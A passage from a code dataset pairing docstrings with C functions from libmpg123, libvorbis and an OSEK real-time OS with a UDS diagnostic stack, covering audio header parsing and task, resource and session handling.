2:\n\t\t\tfr->do_layer = do_layer2;\n\t\t\tdebug2(\"bitrate index: %i (%i)\", fr->bitrate_index, tabsel_123[fr->lsf][1][fr->bitrate_index] );\n\t\t\tfr->framesize = (long) tabsel_123[fr->lsf][1][fr->bitrate_index] * 144000;\n\t\t\tfr->framesize /= freqs[fr->sampling_frequency];\n\t\t\tfr->framesize += fr->padding - 4;\n\t\tbreak;\n\t\tcase 3:\n\t\t\tfr->do_layer = do_layer3;\n\t\t\tif(fr->lsf)\n\t\t\tfr->ssize = (fr->stereo == 1) ? 9 : 17;\n\t\t\telse\n\t\t\tfr->ssize = (fr->stereo == 1) ? 17 : 32;\n\n\t\t\tif(fr->error_protection)\n\t\t\tfr->ssize += 2;\n\n\t\t\tfr->framesize  = (long) tabsel_123[fr->lsf][2][fr->bitrate_index] * 144000;\n\t\t\tfr->framesize /= freqs[fr->sampling_frequency]<<(fr->lsf);\n\t\t\tfr->framesize = fr->framesize + fr->padding - 4;\n\t\tbreak; \n\t\tdefault:\n\t\t\tif(NOQUIET) error(\"unknown layer type (!!)\"); \n\n\t\t\treturn 0;\n\t}\n\tif (fr->framesize > MAXFRAMESIZE)\n\t{\n\t\tif(NOQUIET) error1(\"Frame size too big: %d\", fr->framesize+4-fr->padding);\n\n\t\treturn (0);\n\t}\n\treturn 1;\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\parse.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* Store a new comment that perhaps is a RVA / RVA_ALBUM/AUDIOPHILE / RVA_MIX/RADIO one */\n", "func_signal": "static void process_comment(mpg123_handle *fr, char *realdata, size_t realsize, int rva_level, char *id)", "code": "{\n\t/* Text encoding          $xx */\n\t/* Language               $xx xx xx */\n\t/* Short description (encoded!)      <text> $00 (00) */\n\t/* Then the comment text (encoded) ... */\n\tchar  encoding = realdata[0];\n\tchar *lang    = realdata+1; /* I'll only use the 3 bytes! */\n\tchar *descr   = realdata+4;\n\tchar *text = NULL;\n\tmpg123_text *xcom = NULL;\n\tif(realsize < descr-realdata)\n\t{\n\t\tif(NOQUIET) error1(\"Invalid frame size of %lu (too small for anything).\", (unsigned long)realsize);\n\t\treturn;\n\t}\n\txcom = add_comment(fr);\n\tif(VERBOSE4) fprintf(stderr, \"Note: Storing comment from %s encoding\\n\", enc_name(realdata[0]));\n\tif(xcom == NULL)\n\t{\n\t\tif(NOQUIET) error(\"Unable to attach new comment!\");\n\t\treturn;\n\t}\n\tmemcpy(xcom->lang, lang, 3);\n\tmemcpy(xcom->id, id, 4);\n\t/* Now I can abuse a byte from lang for the encoding. */\n\tdescr[-1] = encoding;\n\t/* Be careful with finding the end of description, I have to honor encoding here. */\n\ttext = next_text(descr, encoding, realsize-(descr-realdata));\n\tif(text == NULL)\n\t{\n\t\tif(NOQUIET) error(\"No comment text / valid description?\");\n\t\tpop_comment(fr);\n\t\treturn;\n\t}\n\tstore_id3_text(&xcom->description, descr-1, text-descr+1, NOQUIET);\n\ttext[-1] = encoding;\n\tstore_id3_text(&xcom->text, text-1, realsize+1-(text-realdata), NOQUIET);\n\n\tif(VERBOSE4)\n\t{\n\t\tfprintf(stderr, \"Note: ID3 comment desc: %s\\n\", xcom->description.fill > 0 ? xcom->description.p : \"\");\n\t\tfprintf(stderr, \"Note: ID3 comment text: %s\\n\", xcom->text.fill > 0 ? xcom->text.p : \"\");\n\t}\n\tif(xcom->description.fill > 0 && xcom->text.fill > 0)\n\t{\n\t\tint rva_mode = -1; /* mix / album */\n\t\tif(   !strcasecmp(xcom->description.p, \"rva\")\n\t\t\t || !strcasecmp(xcom->description.p, \"rva_mix\")\n\t\t\t || !strcasecmp(xcom->description.p, \"rva_track\")\n\t\t\t || !strcasecmp(xcom->description.p, \"rva_radio\"))\n\t\trva_mode = 0;\n\t\telse if(   !strcasecmp(xcom->description.p, \"rva_album\")\n\t\t\t\t\t\t|| !strcasecmp(xcom->description.p, \"rva_audiophile\")\n\t\t\t\t\t\t|| !strcasecmp(xcom->description.p, \"rva_user\"))\n\t\trva_mode = 1;\n\t\tif((rva_mode > -1) && (fr->rva.level[rva_mode] <= rva_level))\n\t\t{\n\t\t\tfr->rva.gain[rva_mode] = atof(xcom->text.p);\n\t\t\tif(VERBOSE3) fprintf(stderr, \"Note: RVA value %fdB\\n\", fr->rva.gain[rva_mode]);\n\t\t\tfr->rva.peak[rva_mode] = 0;\n\t\t\tfr->rva.level[rva_mode] = rva_level;\n\t\t}\n\t}\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\id3.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* The Vorbis header is in three packets; the initial small packet in\n   the first page that identifies basic parameters, a second packet\n   with bitstream comments and a third packet that holds the\n   codebook. */\n", "func_signal": "int vorbis_synthesis_headerin(vorbis_info *vi,vorbis_comment *vc,ogg_packet *op)", "code": "{\n  oggpack_buffer opb;\n\n  if(op){\n    oggpack_readinit(&opb,op->packet,op->bytes);\n\n    /* Which of the three types of header is this? */\n    /* Also verify header-ness, vorbis */\n    {\n      char buffer[6];\n      int packtype=oggpack_read(&opb,8);\n      memset(buffer,0,6);\n      _v_readstring(&opb,buffer,6);\n      if(memcmp(buffer,\"vorbis\",6)){\n        /* not a vorbis header */\n        return(OV_ENOTVORBIS);\n      }\n      switch(packtype){\n      case 0x01: /* least significant *bit* is read first */\n        if(!op->b_o_s){\n          /* Not the initial packet */\n          return(OV_EBADHEADER);\n        }\n        if(vi->rate!=0){\n          /* previously initialized info header */\n          return(OV_EBADHEADER);\n        }\n\n        return(_vorbis_unpack_info(vi,&opb));\n\n      case 0x03: /* least significant *bit* is read first */\n        if(vi->rate==0){\n          /* um... we didn't get the initial header */\n          return(OV_EBADHEADER);\n        }\n\n        return(_vorbis_unpack_comment(vc,&opb));\n\n      case 0x05: /* least significant *bit* is read first */\n        if(vi->rate==0 || vc->vendor==NULL){\n          /* um... we didn;t get the initial header or comments yet */\n          return(OV_EBADHEADER);\n        }\n\n        return(_vorbis_unpack_books(vi,&opb));\n\n      default:\n        /* Not a valid vorbis header type */\n        return(OV_EBADHEADER);\n        break;\n      }\n    }\n  }\n  return(OV_EBADHEADER);\n}", "path": "libraries-src\\ps3soundlib\\libs\\libogg-1.2.1\\info.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* This is more or less the same as strncasecmp - but that doesn't exist\n * everywhere, and this is a fairly trivial function, so we include it */\n", "func_signal": "static int tagcompare(const char *s1, const char *s2, int n)", "code": "{\n  int c=0;\n  while(c < n){\n    if(toupper((int) s1[c]) != toupper((int) s2[c]))\n      return !0;\n    c++;\n  }\n  return 0;\n}", "path": "libraries-src\\ps3soundlib\\libs\\libogg-1.2.1\\info.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* compiler is smart enought to inline this one or should I really do it as macro...? */\n", "func_signal": "int head_check(unsigned long head)", "code": "{\n\tif\n\t(\n\t\t/* first 11 bits are set to 1 for frame sync */\n\t\t((head & 0xffe00000) != 0xffe00000)\n\t\t||\n\t\t/* layer: 01,10,11 is 1,2,3; 00 is reserved */\n\t\t(!((head>>17)&3))\n\t\t||\n\t\t/* 1111 means bad bitrate */\n\t\t(((head>>12)&0xf) == 0xf)\n\t\t||\n\t\t/* 0000 means free format... which should be supported in future. */\n\t\t(((head>>12)&0xf) == 0x0)\n\t\t||\n\t\t/* sampling freq: 11 is reserved */\n\t\t(((head>>10)&0x3) == 0x3 )\n\t\t/* here used to be a mpeg 2.5 check... re-enabled 2.5 decoding due to lack of evidence that it is really not good */\n\t)\n\t{\n\t\treturn FALSE;\n\t}\n\t/* if no check failed, the header is valid (hopefully)*/\n\telse\n\t{\n\t\treturn TRUE;\n\t}\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\parse.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* Set the id3v2.artist id3v2.title ... links to elements of the array. */\n", "func_signal": "void id3_link(mpg123_handle *fr)", "code": "{\n\tsize_t i;\n\tmpg123_id3v2 *v2 = &fr->id3v2;\n\tdebug(\"linking ID3v2\");\n\tnull_id3_links(fr);\n\tfor(i=0; i<v2->texts; ++i)\n\t{\n\t\tmpg123_text *entry = &v2->text[i];\n\t\tif     (!strncmp(\"TIT2\", entry->id, 4)) v2->title  = &entry->text;\n\t\telse if(!strncmp(\"TALB\", entry->id, 4)) v2->album  = &entry->text;\n\t\telse if(!strncmp(\"TPE1\", entry->id, 4)) v2->artist = &entry->text;\n\t\telse if(!strncmp(\"TYER\", entry->id, 4)) v2->year   = &entry->text;\n\t\telse if(!strncmp(\"TCON\", entry->id, 4)) v2->genre  = &entry->text;\n\t}\n\tfor(i=0; i<v2->comments; ++i)\n\t{\n\t\tmpg123_text *entry = &v2->comment_list[i];\n\t\tif(entry->description.fill == 0 || entry->description.p[0] == 0)\n\t\tv2->comment = &entry->text;\n\t}\n\t/* When no generic comment found, use the last non-generic one. */\n\tif(v2->comment == NULL && v2->comments > 0)\n\tv2->comment = &v2->comment_list[v2->comments-1].text;\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\id3.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* A safe realloc also for very old systems where realloc(NULL, size) returns NULL. */\n", "func_signal": "void *safe_realloc(void *ptr, size_t size)", "code": "{\n\tif(ptr == NULL) return malloc(size);\n\telse return realloc(ptr, size);\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\compat.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* helpers */\n", "func_signal": "static int ilog2(unsigned int v)", "code": "{\n  int ret=0;\n  if(v)--v;\n  while(v){\n    ret++;\n    v>>=1;\n  }\n  return(ret);\n}", "path": "libraries-src\\ps3soundlib\\libs\\libogg-1.2.1\\info.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* pack side **********************************************************/\n", "func_signal": "static int _vorbis_pack_info(oggpack_buffer *opb,vorbis_info *vi)", "code": "{\n  codec_setup_info     *ci=vi->codec_setup;\n  if(!ci)return(OV_EFAULT);\n\n  /* preamble */\n  oggpack_write(opb,0x01,8);\n  _v_writestring(opb,\"vorbis\", 6);\n\n  /* basic information about the stream */\n  oggpack_write(opb,0x00,32);\n  oggpack_write(opb,vi->channels,8);\n  oggpack_write(opb,vi->rate,32);\n\n  oggpack_write(opb,vi->bitrate_upper,32);\n  oggpack_write(opb,vi->bitrate_nominal,32);\n  oggpack_write(opb,vi->bitrate_lower,32);\n\n  oggpack_write(opb,ilog2(ci->blocksizes[0]),4);\n  oggpack_write(opb,ilog2(ci->blocksizes[1]),4);\n  oggpack_write(opb,1,1);\n\n  return(0);\n}", "path": "libraries-src\\ps3soundlib\\libs\\libogg-1.2.1\\info.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* take into account: channels, bytes per sample -- NOT resampling!*/\n", "func_signal": "off_t samples_to_bytes(mpg123_handle *fr , off_t s)", "code": "{\n\treturn s\n#ifdef FLOATOUT\n\t\t* 4\n#else\n\t\t* ((fr->af.encoding & MPG123_ENC_16) ? 2 : 1)\n#endif\n\t\t* fr->af.channels;\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\parse.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* blocksize 0 is guaranteed to be short, 1 is guaranteed to be long.\n   They may be equal, but short will never ge greater than long */\n", "func_signal": "int vorbis_info_blocksize(vorbis_info *vi,int zo)", "code": "{\n  codec_setup_info *ci = vi->codec_setup;\n  return ci ? ci->blocksizes[zo] : -1;\n}", "path": "libraries-src\\ps3soundlib\\libs\\libogg-1.2.1\\info.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* Is this packet a vorbis ID header? */\n", "func_signal": "int vorbis_synthesis_idheader(ogg_packet *op)", "code": "{\n  oggpack_buffer opb;\n  char buffer[6];\n\n  if(op){\n    oggpack_readinit(&opb,op->packet,op->bytes);\n\n    if(!op->b_o_s)\n      return(0); /* Not the initial packet */\n\n    if(oggpack_read(&opb,8) != 1)\n      return 0; /* not an ID header */\n\n    memset(buffer,0,6);\n    _v_readstring(&opb,buffer,6);\n    if(memcmp(buffer,\"vorbis\",6))\n      return 0; /* not vorbis */\n\n    return 1;\n  }\n\n  return 0;\n}", "path": "libraries-src\\ps3soundlib\\libs\\libogg-1.2.1\\info.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* used by synthesis, which has a full, alloced vi */\n", "func_signal": "void vorbis_info_init(vorbis_info *vi)", "code": "{\n  memset(vi,0,sizeof(*vi));\n  vi->codec_setup=_ogg_calloc(1,sizeof(codec_setup_info));\n}", "path": "libraries-src\\ps3soundlib\\libs\\libogg-1.2.1\\info.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* all of the real encoding details are here.  The modes, books,\n   everything */\n", "func_signal": "static int _vorbis_unpack_books(vorbis_info *vi,oggpack_buffer *opb)", "code": "{\n  codec_setup_info     *ci=vi->codec_setup;\n  int i;\n  if(!ci)return(OV_EFAULT);\n\n  /* codebooks */\n  ci->books=oggpack_read(opb,8)+1;\n  if(ci->books<=0)goto err_out;\n  for(i=0;i<ci->books;i++){\n    ci->book_param[i]=vorbis_staticbook_unpack(opb);\n    if(!ci->book_param[i])goto err_out;\n  }\n\n  /* time backend settings; hooks are unused */\n  {\n    int times=oggpack_read(opb,6)+1;\n    if(times<=0)goto err_out;\n    for(i=0;i<times;i++){\n      int test=oggpack_read(opb,16);\n      if(test<0 || test>=VI_TIMEB)goto err_out;\n    }\n  }\n\n  /* floor backend settings */\n  ci->floors=oggpack_read(opb,6)+1;\n  if(ci->floors<=0)goto err_out;\n  for(i=0;i<ci->floors;i++){\n    ci->floor_type[i]=oggpack_read(opb,16);\n    if(ci->floor_type[i]<0 || ci->floor_type[i]>=VI_FLOORB)goto err_out;\n    ci->floor_param[i]=_floor_P[ci->floor_type[i]]->unpack(vi,opb);\n    if(!ci->floor_param[i])goto err_out;\n  }\n\n  /* residue backend settings */\n  ci->residues=oggpack_read(opb,6)+1;\n  if(ci->residues<=0)goto err_out;\n  for(i=0;i<ci->residues;i++){\n    ci->residue_type[i]=oggpack_read(opb,16);\n    if(ci->residue_type[i]<0 || ci->residue_type[i]>=VI_RESB)goto err_out;\n    ci->residue_param[i]=_residue_P[ci->residue_type[i]]->unpack(vi,opb);\n    if(!ci->residue_param[i])goto err_out;\n  }\n\n  /* map backend settings */\n  ci->maps=oggpack_read(opb,6)+1;\n  if(ci->maps<=0)goto err_out;\n  for(i=0;i<ci->maps;i++){\n    ci->map_type[i]=oggpack_read(opb,16);\n    if(ci->map_type[i]<0 || ci->map_type[i]>=VI_MAPB)goto err_out;\n    ci->map_param[i]=_mapping_P[ci->map_type[i]]->unpack(vi,opb);\n    if(!ci->map_param[i])goto err_out;\n  }\n\n  /* mode settings */\n  ci->modes=oggpack_read(opb,6)+1;\n  if(ci->modes<=0)goto err_out;\n  for(i=0;i<ci->modes;i++){\n    ci->mode_param[i]=_ogg_calloc(1,sizeof(*ci->mode_param[i]));\n    ci->mode_param[i]->blockflag=oggpack_read(opb,1);\n    ci->mode_param[i]->windowtype=oggpack_read(opb,16);\n    ci->mode_param[i]->transformtype=oggpack_read(opb,16);\n    ci->mode_param[i]->mapping=oggpack_read(opb,8);\n\n    if(ci->mode_param[i]->windowtype>=VI_WINDOWB)goto err_out;\n    if(ci->mode_param[i]->transformtype>=VI_WINDOWB)goto err_out;\n    if(ci->mode_param[i]->mapping>=ci->maps)goto err_out;\n    if(ci->mode_param[i]->mapping<0)goto err_out;\n  }\n\n  if(oggpack_read(opb,1)!=1)goto err_out; /* top level EOP check */\n\n  return(0);\n err_out:\n  vorbis_info_clear(vi);\n  return(OV_EBADHEADER);\n}", "path": "libraries-src\\ps3soundlib\\libs\\libogg-1.2.1\\info.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* Free memory of one element. */\n", "func_signal": "static void free_mpg123_text(mpg123_text *txt)", "code": "{\n\tmpg123_free_string(&txt->text);\n\tmpg123_free_string(&txt->description);\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\id3.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* OK, back t the higher level functions. */\n", "func_signal": "void exit_id3(mpg123_handle *fr)", "code": "{\n\tfree_comment(fr);\n\tfree_extra(fr);\n\tfree_text(fr);\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\id3.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/*\n\tStore any text in UTF8 encoding; preserve the zero string separator (I don't need strlen for the total size).\n\tID3v2 standard says that there should be one text frame of specific type per tag, and subsequent tags overwrite old values.\n\tSo, I always replace the text that may be stored already (perhaps with a list of zero-separated strings, though).\n*/\n", "func_signal": "void store_id3_text(mpg123_string *sb, char *source, size_t source_size, const int noquiet)", "code": "{\n\tint encoding;\n\tint bwidth;\n\tif(!source_size)\n\t{\n\t\tdebug(\"Empty id3 data!\");\n\t\treturn;\n\t}\n\tencoding = source[0];\n\t++source;\n\t--source_size;\n\tdebug1(\"encoding: %i\", encoding);\n\t/* A note: ID3v2.3 uses UCS-2 non-variable 16bit encoding, v2.4 uses UTF16.\n\t   UTF-16 uses a reserved/private range in UCS-2 to add the magic, so we just always treat it as UTF. */\n\tif(encoding > 3)\n\t{\n\t\tif(noquiet) warning1(\"Unknown text encoding %d, assuming ISO8859-1 - I will probably screw a bit up!\", encoding);\n\t\tencoding = 0;\n\t}\n\tbwidth = encoding_widths[encoding];\n\t/* Hack! I've seen a stray zero byte before BOM. Is that supposed to happen? */\n\twhile(source_size > bwidth && source[0] == 0)\n\t{\n\t\t--source_size;\n\t\t++source;\n\t\tdebug(\"skipped leading zero\");\n\t}\n\tif(source_size % bwidth)\n\t{\n\t\t/* When we need two bytes for a character, it's strange to have an uneven bytestream length. */\n\t\tif(noquiet) warning2(\"Weird tag size %d for encoding %d - I will probably trim too early or something but I think the MP3 is broken.\", (int)source_size, encoding);\n\t\tsource_size -= source_size % bwidth;\n\t}\n\ttext_converters[encoding](sb, (unsigned char*)source, source_size);\n\tif(sb->size) debug1(\"UTF-8 string (the first one): %s\", sb->p);\n\telse if(noquiet) error(\"unable to convert string to UTF-8 (out of memory, junk input?)!\");\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\id3.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* Initialize one element. */\n", "func_signal": "static void init_mpg123_text(mpg123_text *txt)", "code": "{\n\tmpg123_init_string(&txt->text);\n\tmpg123_init_string(&txt->description);\n\ttxt->id[0] = 0;\n\ttxt->id[1] = 0;\n\ttxt->id[2] = 0;\n\ttxt->id[3] = 0;\n\ttxt->lang[0] = 0;\n\ttxt->lang[1] = 0;\n\ttxt->lang[2] = 0;\n}", "path": "libraries-src\\ps3soundlib\\libs\\libmpg123\\id3.c", "repo_name": "Estwald/PSDK3v2", "stars": 44, "license": "None", "language": "c", "size": 333582}
{"docstring": "/* |                  | Extended: Resource <ResID> is invalid, E_OS_ID             | */\n/* |                  | Attempt to release a resource which is not occupied by     | */\n/* |                  | any task or ISR, or another resource shall be released     | */\n/* |                  | before, E_OS_NOFUNC                                        | */\n/* |                  | Attempt to release a resource which has a lower ceiling    | */\n/* |                  | priority than the statically assigned priority of the      | */\n/* |                  | calling task or interrupt routine, E_OS_ACCESS             | */\n/* |------------------+------------------------------------------------------------| */\n/* | Conformance:     | BCC1, BCC2, ECC1, ECC2                                     | */\n/* |------------------+------------------------------------------------------------| */\n", "func_signal": "StatusType ReleaseResource ( ResourceType ResID )", "code": "{\n\tStatusType ercd = E_OK;\n\tOS_EXT_VALIDATE((0 == knl_taskindp),E_OS_CALLEVEL); //add as share resource with ISR was not supported\n\tOS_EXT_VALIDATE((ResID < cfgOS_S_RES_NUM),E_OS_ID);\n\tOS_EXT_VALIDATE(knl_tcb_resque[knl_curtsk] == ResID,E_OS_NOFUNC);\n    OS_EXT_VALIDATE((knl_rcb_priority[ResID] >= knl_tcb_ipriority[knl_curtsk]),E_OS_ACCESS);\n\n    BEGIN_CRITICAL_SECTION();\n    knl_tcb_curpri[knl_curtsk] = knl_rcb_tskpri[ResID];\n    // remove it at head\n    knl_tcb_resque[knl_curtsk] = knl_rcb_next[ResID];\n    knl_rcb_tskpri[ResID] = INVALID_PRIORITY;\n    if(knl_tcb_curpri[knl_curtsk] > knl_rdyque.top_pri)\n    {\n        knl_preempt();\n    }\n    END_CRITICAL_SECTION();\nOS_VALIDATE_ERROR_EXIT()\n    OsErrorProcess1(ReleaseResource,resid,ResID);\n\treturn ercd;\n}", "path": "OpenRTOS\\src\\resource.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "//when task start to run\n", "func_signal": "EXPORT void portActivateR(void)", "code": "{\n    /* This is the most easiest Way to get Internal Resourse and\n     * to make a task non-preemtable I think */\n    GetInternalResource();\n\tENABLE_INTERRUPT();\n    knl_tcb_pc[knl_curtsk]();\n}", "path": "OpenRTOS\\src\\portable\\at91sam3s\\portable.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* | Status:          | Standard:                                                   | */\n/* |                  | 1. No return to call level                                  | */\n/* |                  | 2. Too many task activations of <TaskID>, E_OS_LIMIT        | */\n/* |                  | Extended:                                                   | */\n/* |                  | 1. Task <TaskID> is invalid, E_OS_ID                        | */\n/* |                  | 2. Calling task still occupies resources, E_OS_RESOURCE     | */\n/* |                  | 3. Call at interrupt level, E_OS_CALLEVEL                   | */\n/* |------------------+-------------------------------------------------------------| */\n/* | Conformance:     | BCC1, BCC2, ECC1, ECC2                                      | */\n/* |------------------+-------------------------------------------------------------| */\n", "func_signal": "EXPORT  StatusType ChainTask    ( TaskType TaskID )", "code": "{\n\tStatusType ercd = E_OK;\n\tOS_STD_VALIDATE((TaskID<cfgOS_TASK_NUM),E_OS_ID);\n\tOS_EXT_VALIDATE((0 == knl_taskindp),E_OS_CALLEVEL);\n\tOS_EXT_VALIDATE((INVALID_RESOURCE == knl_tcb_resque[knl_curtsk]),E_OS_RESOURCE);\n\tDISABLE_INTERRUPT();\n\tif(TaskID == knl_curtsk)\n\t{\t// chain to itself.\n\t\t//release internal resource or for non-preemtable task\n\t\tReleaseInternalResource();\n\t\tknl_search_schedtsk();\n\t\tknl_make_active(TaskID);\n\t}\n\telse\n\t{\n\n\t\tif(SUSPENDED != knl_tcb_state[TaskID])\n\t\t{\n#if((cfgOS_MULTIPLY_ACTIVATION == 1))\n\t\t\tif(knl_tcb_activation[TaskID] < knl_tcb_max_activation[TaskID])\n\t\t\t{\n\t\t\t\tknl_ready_queue_insert(TaskID);\n\t\t\t\tknl_tcb_activation[TaskID] ++ ;\n\t\t\t}\n\t\t\telse\n#endif\n\t\t\t{\n\t\t\t\tercd = E_OS_LIMIT;\n\t\t\t\tgoto Error_Exit;\n\t\t\t}\n\t\t}\n\n\t\t//release internal resource or for non-preemtable task\n\t\tReleaseInternalResource();\n\t\t//firstly terminate current running task\n#if((cfgOS_MULTIPLY_ACTIVATION == 1))\n\t\tif(knl_tcb_activation[knl_curtsk] > 0)\n\t\t{\n\t\t\tknl_tcb_activation[knl_curtsk] --;\n\t\t\tknl_make_ready(knl_curtsk);\n\t\t}\n\t\telse\n#endif\n\t\t{\n\t\t\tknl_tcb_state[knl_curtsk] = SUSPENDED;\n\t\t}\n\t\t// then search the next running task.\n\t\tknl_search_schedtsk();\n\t\tif(SUSPENDED == knl_tcb_state[TaskID])\n\t\t{\n\t\t\tknl_make_active(TaskID);\n\t\t}\n\t}\n\tknl_force_dispatch();\n\nOS_VALIDATE_ERROR_EXIT()\n\tENABLE_INTERRUPT();\n\tOsErrorProcess1(ChainTask,tskid,TaskID);\n\treturn ercd;\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "// just poll the top priority task in the ready queue\n", "func_signal": "EXPORT TaskType knl_ready_queue_top(void)", "code": "{\n\tPriorityType top_pri = knl_rdyque.top_pri;\n#if((cfgOS_MULTIPLY_ACTIVATION == 1) || (cfgOS_MULTIPLY_PRIORITY == 1))\n\tTaskReadyQueueType *tskque;\n\n\ttskque = &(knl_rdyque.tskque[top_pri]);\n\tif(tskque->head != tskque->tail)\n\t{  // not empty.\n\t\treturn tskque->queue[tskque->head];\n\t}\n\telse\n\t{\n\t\treturn INVALID_TASK;\n\t}\n#else\n\treturn knl_rdyque.tskque[top_pri];\n#endif\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "// Parm: Session is the value from UDS request message\n", "func_signal": "LOCAL Uds_SessionType udsSessionMap(Uds_SessionType Session)", "code": "{\n\tUds_SessionType newS;\n\tif(0u == Session)\n\t{\t// ISOSAEReserved\n\t\t// False\n\t}\n\telse if(Session <= 4)\n\t{   // 01 - 04\n\t\tnewS = Session -1;\n\t}\n\telse if(Session <= 0x3Fu)\n\t{\t// ISOSAEReserved\n\t\t// False\n\t}\n\telse if(Session <= 0x5F)\n\t{\t// vehicleManufacturerSpecific\n\t\t// TODO: Add Special process of your session in this range, see the Session Mask List\n\t}\n\telse if(Session <= 0x7E)\n\t{\t// systemSupplierSpecific\n\t\t// TODO: Add Special process of your session in this range, see the Session Mask List\n\t}\n\treturn newS;\n}", "path": "OpenCom\\src\\Uds.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* @UDS Service: 0x3e */\n", "func_signal": "LOCAL void udsTesterPresentFnc(void)", "code": "{\n\tUds_NrcType nrc = UDS_E_POSITIVERESPONSE;\n\tif(2u == udsRte.rxLength)\n\t{\n\t\tuint8 subFnc = udsGetSerivceData(1); //\n\t\tif((0x80U&subFnc) != 0)\n\t\t{\n\t\t\tudsRte.suppressPosRspMsg = True;\n\t\t\tsubFnc = subFnc&0x7F;\n\t\t}\n\t\tif(0x00 == subFnc)\n\t\t{\n\t\t\tudsSetAlarm(msToUdsTick(cfgP2Server));\n\t\t\tudsSetResponseCode(1,0x00);\n\t\t\tudsRte.txLength = 2;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tnrc = UDS_E_SUBFUNCTIONNOTSUPPORTED;\n\t\t}\n\t}\n\telse\n\t{\n\t\tnrc = UDS_E_INCORRECTMESSAGELENGTHORINVALIDFORMAT;\n\t}\n\tudsProcessingDone(nrc);\n}", "path": "OpenCom\\src\\Uds.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "// put into ready-queue\n", "func_signal": "EXPORT void knl_make_runnable(TaskType taskid)", "code": "{\n\tassert(INVALID_TASK != taskid);\n\tif(INVALID_TASK != knl_schedtsk)\n\t{\n\t\tif(knl_tcb_curpri[taskid] > knl_tcb_curpri[knl_schedtsk])\n\t\t{   /* taskid has higher priority */\n\t\t\t//when task is non-preemtable,its priority will be the highest when run.\n\t\t\tknl_ready_queue_insert_top(knl_schedtsk);\n\t\t}\n\t\telse\n\t\t{   /* taskid has lower priority */\n\t\t\tknl_ready_queue_insert(taskid);\n\t\t\treturn;\n\t\t}\n\t}\n\tknl_schedtsk = taskid;\n}", "path": "OpenRTOS\\src\\task.c", "repo_name": "parai/OpenOSEK", "stars": 52, "license": "None", "language": "c", "size": 10250}
{"docstring": "/* |------------------+-----------------------------------------------------------| */\n/* | Status:          | Standard:1.No error, E_OK                                 | */\n/* |                  | Extended:1.Resource <ResID> is invalid, E_OS_ID           | */\n/* |                  | 2.Attempt to get a resource which is already occupied     | */\n/* |                  | by any task or ISR, or the statically assigned priority   | */\n/* |                  | of the calling task or interrupt routine is higher than   | */\n/* |                  | the calculated ceiling priority, E_OS_ACCESS              | */\n/* |------------------+-----------------------------------------------------------| */\n/* | Conformance:     | BCC1, BCC2, ECC1, ECC2                                    | */\n/* |------------------+-----------------------------------------------------------| */\n", "func_signal": "StatusType GetResource (ResourceType ResID)", "code": "{\n\tStatusType ercd = E_OK;\n\tOS_EXT_VALIDATE((0 == knl_taskindp),E_OS_CALLEVEL); //add as share resource with ISR was not supported\n\tOS_EXT_VALIDATE((ResID < cfgOS_S_RES_NUM),E_OS_ID);\n\tOS_EXT_VALIDATE((INVALID_PRIORITY == knl_rcb_tskpri[ResID]),E_OS_ACCESS);\n    OS_EXT_VALIDATE((knl_rcb_priority[ResID] >= knl_tcb_ipriority[knl_curtsk]),E_OS_ACCESS);\n\n    BEGIN_DISABLE_INTERRUPT();\n    knl_rcb_tskpri[ResID] = knl_tcb_curpri[knl_curtsk];  // save task old priority\n    if(knl_rcb_priority[ResID] > knl_tcb_ipriority[knl_curtsk])\n    {\n    \tknl_tcb_curpri[knl_curtsk] = knl_rcb_priority[ResID];\n    